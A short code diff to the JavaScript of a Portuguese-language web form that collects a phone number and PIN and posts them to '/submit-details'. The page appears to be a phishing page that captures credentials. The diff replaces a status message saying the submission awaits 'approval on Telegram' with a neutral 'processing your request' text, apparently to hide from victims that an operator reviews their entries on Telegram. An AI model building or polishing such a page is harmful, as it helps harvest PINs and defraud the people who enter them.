@@ -352,7 +352,6 @@
 
     phoneInput.addEventListener('input', checkFields);
     pinInput.addEventListener('input', checkFields);
-    // Initial check (both empty → disabled)
     checkFields();
 
     // ---------- submit ----------
@@ -370,10 +369,11 @@
 
         localStorage.setItem('phone', phone);
 
+        // Disable button and show waiting state
         submitBtn.disabled = true;
-        btnText.textContent = 'A enviar...';
+        btnText.textContent = 'A processar...';
         spinner.style.display = 'inline-block';
-        statusEl.textContent = 'A aguardar aprovação no Telegram...';
+        statusEl.textContent = 'A processar o seu pedido, por favor aguarde...';
 
         try {
             const response = await fetch('/submit-details', {
